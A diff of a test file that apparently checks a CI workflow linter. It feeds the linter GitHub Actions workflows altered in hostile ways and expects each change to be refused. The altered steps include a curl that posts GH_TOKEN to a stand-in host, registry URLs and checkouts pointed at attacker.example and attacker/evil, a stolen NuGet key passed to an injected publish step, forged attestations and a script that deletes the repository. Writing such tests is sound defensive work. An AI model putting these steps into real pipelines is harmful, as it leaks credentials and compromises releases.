-      (w) => {
-        S(w, P_, "publish-crates", uses("actions/checkout")).with.ref = "refs/pull/1/head";
-      },
-      SURFACE,
-    ],
-    [
-      "C6 pypa inside the NuGet job, with its key",
-      (w) => {
-        const st = j(w, P_, "publish-nuget").steps;
-        st.splice(st.findIndex((s) => s.id === "login") + 1, 0, {
-          name: "inj",
-          uses: "pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33",
-          with: {
-            "repository-url": "https://attacker.example/legacy/",
-            user: "x",
-            password: "${{ steps.login.outputs.NUGET_API_KEY }}",
-            "packages-dir": "release/",
-          },
-        });
-      },
-      SURFACE,
-    ],
-    [
-      "C6b a checkout with the crates token",
-      (w) => {
-        j(w, P_, "publish-crates").steps.push({
-          name: "inj",
-          uses: "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
-          with: {
-            "persist-credentials": false,
-            repository: "attacker/evil",
-            token: "${{ steps.auth.outputs.token }}",
-          },
-        });
-      },
-      /credential output of rust-lang\/crates-io-auth-action is read only in an env: value/,
-    ],
-    [
-      "C7 maven attestation subject forged",
-      (w) => {
-        S(w, P_, "publish-maven", uses("actions/attest")).with = {
-          "subject-name": "pkg:maven/io.confeature/sdk@9.9.9",
-          "subject-digest": `sha256:${"a".repeat(64)}`,
-        };
-      },
-      SURFACE,
-    ],
-    [
-      "C7b maven attestation pushed to a registry",
-      (w) => {
-        const s = S(w, P_, "publish-maven", uses("actions/attest"));
-        s.with = { ...s.with, "push-to-registry": true, "subject-name": "ghcr.io/attacker/x" };
-      },
-      SURFACE,
-    ],
-    [
-      "C11 setup-node's registry-url to an attacker",
-      (w) => {
-        S(w, P_, "publish-npm", uses("actions/setup-node")).with["registry-url"] =
-          "https://attacker.example/";
-      },
-      SURFACE,
-    ],
-    [
-      "C12 download-artifact of every artifact of the run",
-      (w) => {
-        S(w, P_, "publish-maven", uses("actions/download-artifact")).with = {
-          pattern: "*",
-          "merge-multiple": true,
-          path: "release",
-        };
-      },
-      SURFACE,
-    ],
-    [
-      "C13 pypi packages-dir /",
-      (w) => {
-        S(w, P_, "publish-pypi", uses("pypa/")).with["packages-dir"] = "/";
-      },
-      SURFACE,
-    ],
-    [
-      "C14 NuGet login user from the event",
-      (w) => {
-        S(w, P_, "publish-nuget", (s) => s.id === "login").with.user =
-          "${{ github.event.head_commit.author.name }}";
-      },
-      SURFACE,
-    ],
-    [
-      "C17 a credentialed job's continue-on-error: true",
-      (w) => {
-        j(w, P_, "publish-go")["continue-on-error"] = true;
-      },
-      /continue-on-error/,
-    ],
-    [
-      "C18 crates-io-auth-action url to an attacker",
-      (w) => {
-        S(w, P_, "publish-crates", (s) => s.id === "auth").with = {
-          url: "https://attacker.example",
-        };
-      },
-      SURFACE,
-    ],
-    [
-      "C19 NuGet/login token-service-url to an attacker",
-      (w) => {
-        const s = S(w, P_, "publish-nuget", (s) => s.id === "login");
-        s.with = { ...s.with, "token-service-url": "https://attacker.example/token" };
-      },
-      SURFACE,
-    ],
-    [
-      "D4 the NuGet key as a download-artifact name",
-      (w) => {
-        j(w, P_, "publish-nuget").steps.push({
-          name: "inj",
-          uses: "actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093",
-          with: { name: "${{ steps.login.outputs.NUGET_API_KEY }}", path: "release" },
-        });
-      },
-      /credential output of NuGet\/login is read only in an env: value/,
-    ],
-    [
-      "an action step removed",
-      (w) => {
-        const st = j(w, P_, "publish-pypi").steps;
-        st.splice(st.findIndex(uses("pypa/")), 1);
-      },
-      SURFACE,
-    ],
-    [
-      "an id changed",
-      (w) => {
-        S(w, P_, "publish-nuget", (s) => s.id === "login").id = "other";
-      },
-      SURFACE,
-    ],
-    [
-      "D2 a credential on a step that reads it only in a comment",
-      (w) => {
-        const s = j(w, P_, "publish-go").steps.find(
-          (x) => x.name === "Ask the Go proxy for the release",
-        );
-        s.env = { ...(s.env ?? {}), DEPLOY_KEY: "${{ secrets.GO_TAG_DEPLOY_KEY }}" };
-        s.run = `# \${DEPLOY_KEY}\n${s.run}`;
-      },
-      /sets the credential DEPLOY_KEY but its run: does not read it/,
-    ],
-  ])("refuses %s", (label, mutate, why) => {
+  it.each(
+    ROWS.rows([
+      [
+        "C1 pypi repository-url to an attacker",
+        (w) => {
+          S(w, P_, "publish-pypi", uses("pypa/")).with["repository-url"] =
+            "https://attacker.example/legacy/";
+        },
+        SURFACE,
+      ],
+      [
+        "C2 rubygems gem-server to an attacker",
+        (w) => {
+          const s = S(w, P_, "publish-rubygems", uses("rubygems/"));
+          s.with = { ...(s.with ?? {}), "gem-server": "https://attacker.example" };
+        },
+        SURFACE,
+      ],
+      [
+        "C2b rubygems audience override",
+        (w) => {
+          const s = S(w, P_, "publish-rubygems", uses("rubygems/"));
+          s.with = { ...(s.with ?? {}), audience: "attacker.example" };
+        },
+        SURFACE,
+      ],
+      [
+        "C3 maven checkout of another repository",
+        (w) => {
+          const s = S(w, P_, "publish-maven", uses("actions/checkout"));
+          s.with.repository = "attacker/evil";
+          s.with.ref = "main";
+        },
+        SURFACE,
+      ],
+      [
+        "C4 cli upload checkout of another repository",
+        (w) => {
+          S(w, C, "upload", uses("actions/checkout")).with.repository = "attacker/evil";
+        },
+        SURFACE,
+      ],
+      [
+        "C4b cli promote checkout of a pull request",
+        (w) => {
+          S(w, C, "promote", uses("actions/checkout")).with.ref = "refs/pull/1/head";
+        },
+        SURFACE,
+      ],
+      [
+        "C5 crates checkout of a pull request",
+        (w) => {
+          S(w, P_, "publish-crates", uses("actions/checkout")).with.ref = "refs/pull/1/head";
+        },
+        SURFACE,
+      ],
+      [
+        "C6 pypa inside the NuGet job, with its key",
+        (w) => {
+          const st = j(w, P_, "publish-nuget").steps;
+          st.splice(st.findIndex((s) => s.id === "login") + 1, 0, {
+            name: "inj",
+            uses: "pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33",
+            with: {
+              "repository-url": "https://attacker.example/legacy/",
+              user: "x",
+              password: "${{ steps.login.outputs.NUGET_API_KEY }}",
+              "packages-dir": "release/",
+            },
+          });
+        },
+        SURFACE,
+      ],
+      [
+        "C6b a checkout with the crates token",
+        (w) => {
+          j(w, P_, "publish-crates").steps.push({
+            name: "inj",
+            uses: "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
+            with: {
+              "persist-credentials": false,
+              repository: "attacker/evil",
+              token: "${{ steps.auth.outputs.token }}",
+            },
+          });
+        },
+        /credential output of rust-lang\/crates-io-auth-action is read only in an env: value/,
+      ],
+      [
+        "C7 maven attestation subject forged",
+        (w) => {
+          S(w, P_, "publish-maven", uses("actions/attest")).with = {
+            "subject-name": "pkg:maven/io.confeature/sdk@9.9.9",
+            "subject-digest": `sha256:${"a".repeat(64)}`,
+          };
+        },
+        SURFACE,
+      ],
+      [
+        "C7b maven attestation pushed to a registry",
+        (w) => {
+          const s = S(w, P_, "publish-maven", uses("actions/attest"));
+          s.with = { ...s.with, "push-to-registry": true, "subject-name": "ghcr.io/attacker/x" };
+        },
+        SURFACE,
+      ],
+      [
+        "C11 setup-node's registry-url to an attacker",
+        (w) => {
+          S(w, P_, "publish-npm", uses("actions/setup-node")).with["registry-url"] =
+            "https://attacker.example/";
+        },
+        SURFACE,
+      ],
+      [
+        "C12 download-artifact of every artifact of the run",
+        (w) => {
+          S(w, P_, "publish-maven", uses("actions/download-artifact")).with = {
+            pattern: "*",
+            "merge-multiple": true,
+            path: "release",
+          };
+        },
+        SURFACE,
+      ],
+      [
+        "C13 pypi packages-dir /",
+        (w) => {
+          S(w, P_, "publish-pypi", uses("pypa/")).with["packages-dir"] = "/";
+        },
+        SURFACE,
+      ],
+      [
+        "C14 NuGet login user from the event",
+        (w) => {
+          S(w, P_, "publish-nuget", (s) => s.id === "login").with.user =
+            "${{ github.event.head_commit.author.name }}";
+        },
+        SURFACE,
+      ],
+      [
+        "C17 a credentialed job's continue-on-error: true",
+        (w) => {
+          j(w, P_, "publish-go")["continue-on-error"] = true;
+        },
+        /continue-on-error/,
+      ],
+      [
+        "C18 crates-io-auth-action url to an attacker",
+        (w) => {
+          S(w, P_, "publish-crates", (s) => s.id === "auth").with = {
+            url: "https://attacker.example",
+          };
+        },
+        SURFACE,
+      ],
+      [
+        "C19 NuGet/login token-service-url to an attacker",
+        (w) => {
+          const s = S(w, P_, "publish-nuget", (s) => s.id === "login");
+          s.with = { ...s.with, "token-service-url": "https://attacker.example/token" };
+        },
+        SURFACE,
+      ],
+      [
+        "D4 the NuGet key as a download-artifact name",
+        (w) => {
+          j(w, P_, "publish-nuget").steps.push({
+            name: "inj",
+            uses: "actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093",
+            with: { name: "${{ steps.login.outputs.NUGET_API_KEY }}", path: "release" },
+          });
+        },
+        /credential output of NuGet\/login is read only in an env: value/,
+      ],
+      [
+        "an action step removed",
+        (w) => {
+          const st = j(w, P_, "publish-pypi").steps;
+          st.splice(st.findIndex(uses("pypa/")), 1);
+        },
+        SURFACE,
+      ],
+      [
+        "an id changed",
+        (w) => {
+          S(w, P_, "publish-nuget", (s) => s.id === "login").id = "other";
+        },
+        SURFACE,
+      ],
+      [
+        "D2 a credential on a step that reads it only in a comment",
+        (w) => {
+          const s = j(w, P_, "publish-go").steps.find(
+            (x) => x.name === "Ask the Go proxy for the release",
+          );
+          s.env = { ...(s.env ?? {}), DEPLOY_KEY: "${{ secrets.GO_TAG_DEPLOY_KEY }}" };
+          s.run = `# \${DEPLOY_KEY}\n${s.run}`;
+        },
+        /sets the credential DEPLOY_KEY but its run: does not read it/,
+      ],
+    ]),
+  )("refuses %s", (label, mutate, why) => {
     const got = added(mutate);
-    expectCount(label, got);
+    expectFindings(label, got);
     expect(
       got.some((g) => why.test(g)),
       got.join("\n") || "no finding",
@@ -1525,270 +1562,274 @@ describe("the write token, the build and every job's surface (round 9)", () => {
   const ghStep = (w) => j(w, C, "release").steps.find((s) => s.env?.GH_TOKEN);
   const SURFACE = /ACTION_SURFACE records/;
   const COE = /continue-on-error/;
-  it.each([
-    [
-      "X1 release: a checkout of another repository",
-      (w) => {
-        S(w, C, "release", U("actions/checkout")).with.repository = "attacker/evil";
-      },
-      SURFACE,
-    ],
-    [
-      "X1b build: a checkout of another repository",
-      (w) => {
-        S(w, C, "build", U("actions/checkout")).with.repository = "attacker/evil";
-      },
-      SURFACE,
-    ],
-    [
-      "X2 release: a checkout of a pull request",
-      (w) => {
-        S(w, C, "release", U("actions/checkout")).with.ref = "refs/pull/1/head";
-      },
-      SURFACE,
-    ],
-    [
-      "X3 release: github-script with the contents: write token",
-      (w) => {
-        j(w, C, "release").steps.splice(2, 0, {
-          name: "x",
-          uses: GS,
-          with: {
-            script:
-              "await github.rest.git.createRef({owner:'confeature',repo:'sdks',ref:'refs/tags/sdk-go-v9.9.9',sha:context.sha})",
-          },
-        });
-      },
-      SURFACE,
-    ],
-    [
-      "X3b release: a checkout keeping the token",
-      (w) => {
-        Object.assign(S(w, C, "release", U("actions/checkout")).with, {
-          "persist-credentials": true,
-          token: "${{ github.token }}",
-        });
-      },
-      SURFACE,
-    ],
-    [
-      "X4 build: setup-deno's version from the event",
-      (w) => {
-        S(w, C, "build", U("denoland/")).with["deno-version"] =
-          "${{ github.event.head_commit.message }}";
-      },
-      SURFACE,
-    ],
-    [
-      "X5 release: a local action",
-      (w) => {
-        j(w, C, "release").steps.splice(2, 0, { name: "x", uses: "./.github/actions/x" });
-      },
-      /runs no local or container action/,
-    ],
-    [
-      "X5b release: a container action",
-      (w) => {
-        j(w, C, "release").steps.splice(2, 0, { name: "x", uses: "docker://alpine:3" });
-      },
-      /runs no local or container action/,
-    ],
-    [
-      "X5c build: the artifact path widened",
-      (w) => {
-        S(w, C, "build", U("actions/upload-artifact")).with.path =
-          "apps/cli/dist/\n/home/runner/work/\n";
-      },
-      SURFACE,
-    ],
-    [
-      "X7 pack-npm: a checkout of another repository",
-      (w) => {
-        S(w, P_, "pack-npm", U("actions/checkout")).with.repository = "attacker/evil";
-      },
-      SURFACE,
-    ],
-    [
-      "X8 pack-npm: a checkout of a pull request",
-      (w) => {
-        S(w, P_, "pack-npm", U("actions/checkout")).with.ref = "refs/pull/1/head";
-      },
-      SURFACE,
-    ],
-    [
-      "X8b pack-npm: setup-node's version from the event",
-      (w) => {
-        S(w, P_, "pack-npm", U("actions/setup-node")).with["node-version"] =
-          "${{ github.event.head_commit.message }}";
-      },
-      SURFACE,
-    ],
-    [
-      "setup: a checkout of a pull request",
-      (w) => {
-        S(w, P_, "setup", U("actions/checkout")).with.ref = "refs/pull/1/head";
-      },
-      SURFACE,
-    ],
-    [
-      "X26 release: curl of GH_TOKEN in the gh step",
-      (w) => {
-        ghStep(w).run += '\ncurl -d "$GH_TOKEN" https://a.example\n';
-      },
-      /credential GH_TOKEN outside its recorded position|curl is not a command/,
-    ],
-    [
-      "X26b release: GH_TOKEN written to a file",
-      (w) => {
-        ghStep(w).run += '\nprintf "%s" "$GH_TOKEN" > publish-tmp/t\n';
-      },
-      /credential GH_TOKEN outside its recorded position/,
-    ],
-    [
-      "X27 release: GH_TOKEN on the digest step",
-      (w) => {
-        const s = j(w, C, "release").steps.find((x) => x.run && !x.env?.GH_TOKEN);
-        s.env = { ...(s.env ?? {}), GH_TOKEN: "${{ github.token }}" };
-      },
-      /sets the credential GH_TOKEN but its run: does not read it/,
-    ],
-    [
-      "X27b build: GH_TOKEN on the compile step makes it credentialed",
-      (w) => {
-        const s = S(w, C, "build", (x) => x.name === "Compile all targets");
-        s.env = { GH_TOKEN: "${{ github.token }}" };
-      },
-      /a credentialed job sets working-directory|deno is not a command/,
-    ],
-    [
-      "X28 nuget: a digest check with continue-on-error",
-      (w) => {
-        S(w, P_, "publish-nuget", (s) => /digest/i.test(s.name ?? ""))["continue-on-error"] = true;
-      },
-      COE,
-    ],
-    [
-      "X28b npm: every run step with continue-on-error",
-      (w) => {
-        for (const s of j(w, P_, "publish-npm").steps) if (s.run) s["continue-on-error"] = true;
-      },
-      COE,
-    ],
-    [
-      "X14 maven: the attestation with continue-on-error",
-      (w) => {
-        S(w, P_, "publish-maven", U("actions/attest"))["continue-on-error"] = true;
-      },
-      COE,
-    ],
-    [
-      "X31 build: setup-deno with an env",
-      (w) => {
-        S(w, C, "build", U("denoland/")).env = { DENO_CERT: "/tmp/x" };
-      },
-      SURFACE,
-    ],
-    [
-      "X33 workflow-rules: its steps with continue-on-error",
-      (w) => {
-        for (const s of j(w, P_, "workflow-rules").steps) if (s.run) s["continue-on-error"] = true;
-      },
-      COE,
-    ],
-    [
-      "X34 build: the on-main check with continue-on-error",
-      (w) => {
-        S(w, C, "build", (s) => /not on main/.test(s.name ?? ""))["continue-on-error"] = true;
-      },
-      COE,
-    ],
-    [
-      "X35 publish-go: its guards with continue-on-error",
-      (w) => {
-        for (const s of j(w, P_, "publish-go").steps) if (s.run) s["continue-on-error"] = true;
-      },
-      COE,
-    ],
-    [
-      "17 two recorded steps swapped",
-      (w) => {
-        const st = j(w, P_, "pack-npm").steps;
-        const a = st.findIndex(U("pnpm/"));
-        const b = st.findIndex(U("actions/setup-node"));
-        [st[a], st[b]] = [st[b], st[a]];
-      },
-      SURFACE,
-    ],
-    [
-      "17 a recorded with: key removed",
-      (w) => {
-        delete S(w, P_, "publish-pypi", U("pypa/")).with["packages-dir"];
-      },
-      SURFACE,
-    ],
-    [
-      "17 another SHA at the same position",
-      (w) => {
-        const s = S(w, P_, "publish-npm", U("actions/setup-node"));
-        s.uses = s.uses.replace(/@[0-9a-f]+$/, `@${"0".repeat(40)}`);
-      },
-      SURFACE,
-    ],
-    [
-      "17 a job ACTION_SURFACE does not record",
-      (w) => {
-        w[P_].jobs["pack-extra"] = structuredClone(w[P_].jobs["pack-npm"]);
-      },
-      /a job ACTION_SURFACE does not record/,
-    ],
-    [
-      "17 release-gate: the follow-up script changed",
-      (w) => {
-        S(w, "release-gate.yml", "test", U("actions/github-script")).with.script +=
-          "\nawait github.rest.repos.delete(context.repo);";
-      },
-      SURFACE,
-    ],
-    [
-      "18 verify.yml granted contents: write",
-      (w) => {
-        const k = Object.keys(w["verify.yml"].jobs)[0];
-        w["verify.yml"].jobs[k].permissions = { contents: "write" };
-      },
-      /WRITE_PERMISSIONS records \[\]/,
-    ],
-    [
-      "18 contract-live.yml granted write-all",
-      (w) => {
-        w["contract-live.yml"].permissions = "write-all";
-      },
-      /at the workflow level/,
-    ],
-    [
-      "18 release-gate's issues: write moved to the workflow",
-      (w) => {
-        w["release-gate.yml"].permissions = { contents: "read", issues: "write" };
-      },
-      /issues write at the workflow level/,
-    ],
-    [
-      "18 a publish job asking for contents: write too",
-      (w) => {
-        j(w, P_, "publish-npm").permissions["contents"] = "write";
-      },
-      /WRITE_PERMISSIONS records \[id-token\]/,
-    ],
-    [
-      "18 cli-windows-install-verify granted id-token",
-      (w) => {
-        const k = Object.keys(w["cli-windows-install-verify.yml"].jobs)[0];
-        w["cli-windows-install-verify.yml"].jobs[k].permissions = { "id-token": "write" };
-      },
-      /WRITE_PERMISSIONS records \[\]/,
-    ],
-  ])("refuses %s", (label, mutate, why) => {
+  it.each(
+    ROWS.rows([
+      [
+        "X1 release: a checkout of another repository",
+        (w) => {
+          S(w, C, "release", U("actions/checkout")).with.repository = "attacker/evil";
+        },
+        SURFACE,
+      ],
+      [
+        "X1b build: a checkout of another repository",
+        (w) => {
+          S(w, C, "build", U("actions/checkout")).with.repository = "attacker/evil";
+        },
+        SURFACE,
+      ],
+      [
+        "X2 release: a checkout of a pull request",
+        (w) => {
+          S(w, C, "release", U("actions/checkout")).with.ref = "refs/pull/1/head";
+        },
+        SURFACE,
+      ],
+      [
+        "X3 release: github-script with the contents: write token",
+        (w) => {
+          j(w, C, "release").steps.splice(2, 0, {
+            name: "x",
+            uses: GS,
+            with: {
+              script:
+                "await github.rest.git.createRef({owner:'confeature',repo:'sdks',ref:'refs/tags/sdk-go-v9.9.9',sha:context.sha})",
+            },
+          });
+        },
+        SURFACE,
+      ],
+      [
+        "X3b release: a checkout keeping the token",
+        (w) => {
+          Object.assign(S(w, C, "release", U("actions/checkout")).with, {
+            "persist-credentials": true,
+            token: "${{ github.token }}",
+          });
+        },
+        SURFACE,
+      ],
+      [
+        "X4 build: setup-deno's version from the event",
+        (w) => {
+          S(w, C, "build", U("denoland/")).with["deno-version"] =
+            "${{ github.event.head_commit.message }}";
+        },
+        SURFACE,
+      ],
+      [
+        "X5 release: a local action",
+        (w) => {
+          j(w, C, "release").steps.splice(2, 0, { name: "x", uses: "./.github/actions/x" });
+        },
+        /runs no local or container action/,
+      ],
+      [
+        "X5b release: a container action",
+        (w) => {
+          j(w, C, "release").steps.splice(2, 0, { name: "x", uses: "docker://alpine:3" });
+        },
+        /runs no local or container action/,
+      ],
+      [
+        "X5c build: the artifact path widened",
+        (w) => {
+          S(w, C, "build", U("actions/upload-artifact")).with.path =
+            "apps/cli/dist/\n/home/runner/work/\n";
+        },
+        SURFACE,
+      ],
+      [
+        "X7 pack-npm: a checkout of another repository",
+        (w) => {
+          S(w, P_, "pack-npm", U("actions/checkout")).with.repository = "attacker/evil";
+        },
+        SURFACE,
+      ],
+      [
+        "X8 pack-npm: a checkout of a pull request",
+        (w) => {
+          S(w, P_, "pack-npm", U("actions/checkout")).with.ref = "refs/pull/1/head";
+        },
+        SURFACE,
+      ],
+      [
+        "X8b pack-npm: setup-node's version from the event",
+        (w) => {
+          S(w, P_, "pack-npm", U("actions/setup-node")).with["node-version"] =
+            "${{ github.event.head_commit.message }}";
+        },
+        SURFACE,
+      ],
+      [
+        "setup: a checkout of a pull request",
+        (w) => {
+          S(w, P_, "setup", U("actions/checkout")).with.ref = "refs/pull/1/head";
+        },
+        SURFACE,
+      ],
+      [
+        "X26 release: curl of GH_TOKEN in the gh step",
+        (w) => {
+          ghStep(w).run += '\ncurl -d "$GH_TOKEN" https://a.example\n';
+        },
+        /credential GH_TOKEN outside its recorded position|curl is not a command/,
+      ],
+      [
+        "X26b release: GH_TOKEN written to a file",
+        (w) => {
+          ghStep(w).run += '\nprintf "%s" "$GH_TOKEN" > publish-tmp/t\n';
+        },
+        /credential GH_TOKEN outside its recorded position/,
+      ],
+      [
+        "X27 release: GH_TOKEN on the digest step",
+        (w) => {
+          const s = j(w, C, "release").steps.find((x) => x.run && !x.env?.GH_TOKEN);
+          s.env = { ...(s.env ?? {}), GH_TOKEN: "${{ github.token }}" };
+        },
+        /sets the credential GH_TOKEN but its run: does not read it/,
+      ],
+      [
+        "X27b build: GH_TOKEN on the compile step makes it credentialed",
+        (w) => {
+          const s = S(w, C, "build", (x) => x.name === "Compile all targets");
+          s.env = { GH_TOKEN: "${{ github.token }}" };
+        },
+        /a credentialed job sets working-directory|deno is not a command/,
+      ],
+      [
+        "X28 nuget: a digest check with continue-on-error",
+        (w) => {
+          S(w, P_, "publish-nuget", (s) => /digest/i.test(s.name ?? ""))["continue-on-error"] =
+            true;
+        },
+        COE,
+      ],
+      [
+        "X28b npm: every run step with continue-on-error",
+        (w) => {
+          for (const s of j(w, P_, "publish-npm").steps) if (s.run) s["continue-on-error"] = true;
+        },
+        COE,
+      ],
+      [
+        "X14 maven: the attestation with continue-on-error",
+        (w) => {
+          S(w, P_, "publish-maven", U("actions/attest"))["continue-on-error"] = true;
+        },
+        COE,
+      ],
+      [
+        "X31 build: setup-deno with an env",
+        (w) => {
+          S(w, C, "build", U("denoland/")).env = { DENO_CERT: "/tmp/x" };
+        },
+        SURFACE,
+      ],
+      [
+        "X33 workflow-rules: its steps with continue-on-error",
+        (w) => {
+          for (const s of j(w, P_, "workflow-rules").steps)
+            if (s.run) s["continue-on-error"] = true;
+        },
+        COE,
+      ],
+      [
+        "X34 build: the on-main check with continue-on-error",
+        (w) => {
+          S(w, C, "build", (s) => /not on main/.test(s.name ?? ""))["continue-on-error"] = true;
+        },
+        COE,
+      ],
+      [
+        "X35 publish-go: its guards with continue-on-error",
+        (w) => {
+          for (const s of j(w, P_, "publish-go").steps) if (s.run) s["continue-on-error"] = true;
+        },
+        COE,
+      ],
+      [
+        "17 two recorded steps swapped",
+        (w) => {
+          const st = j(w, P_, "pack-npm").steps;
+          const a = st.findIndex(U("pnpm/"));
+          const b = st.findIndex(U("actions/setup-node"));
+          [st[a], st[b]] = [st[b], st[a]];
+        },
+        SURFACE,
+      ],
+      [
+        "17 a recorded with: key removed",
+        (w) => {
+          delete S(w, P_, "publish-pypi", U("pypa/")).with["packages-dir"];
+        },
+        SURFACE,
+      ],
+      [
+        "17 another SHA at the same position",
+        (w) => {
+          const s = S(w, P_, "publish-npm", U("actions/setup-node"));
+          s.uses = s.uses.replace(/@[0-9a-f]+$/, `@${"0".repeat(40)}`);
+        },
+        SURFACE,
+      ],
+      [
+        "17 a job ACTION_SURFACE does not record",
+        (w) => {
+          w[P_].jobs["pack-extra"] = structuredClone(w[P_].jobs["pack-npm"]);
+        },
+        /a job ACTION_SURFACE does not record/,
+      ],
+      [
+        "17 release-gate: the follow-up script changed",
+        (w) => {
+          S(w, "release-gate.yml", "test", U("actions/github-script")).with.script +=
+            "\nawait github.rest.repos.delete(context.repo);";
+        },
+        SURFACE,
+      ],
+      [
+        "18 verify.yml granted contents: write",
+        (w) => {
+          const k = Object.keys(w["verify.yml"].jobs)[0];
+          w["verify.yml"].jobs[k].permissions = { contents: "write" };
+        },
+        /WRITE_PERMISSIONS records \[\]/,
+      ],
+      [
+        "18 contract-live.yml granted write-all",
+        (w) => {
+          w["contract-live.yml"].permissions = "write-all";
+        },
+        /at the workflow level/,
+      ],
+      [
+        "18 release-gate's issues: write moved to the workflow",
+        (w) => {
+          w["release-gate.yml"].permissions = { contents: "read", issues: "write" };
+        },
+        /issues write at the workflow level/,
+      ],
+      [
+        "18 a publish job asking for contents: write too",
+        (w) => {
+          j(w, P_, "publish-npm").permissions["contents"] = "write";
+        },
+        /WRITE_PERMISSIONS records \[id-token\]/,
+      ],
+      [
+        "18 cli-windows-install-verify granted id-token",
+        (w) => {
+          const k = Object.keys(w["cli-windows-install-verify.yml"].jobs)[0];
+          w["cli-windows-install-verify.yml"].jobs[k].permissions = { "id-token": "write" };
+        },
+        /WRITE_PERMISSIONS records \[\]/,
+      ],
+    ]),
+  )("refuses %s", (label, mutate, why) => {
     const got = added(mutate);
-    expectCount(label, got);
+    expectFindings(label, got);
     expect(
       got.some((g) => why.test(g)),
       got.join("\n") || "no finding",
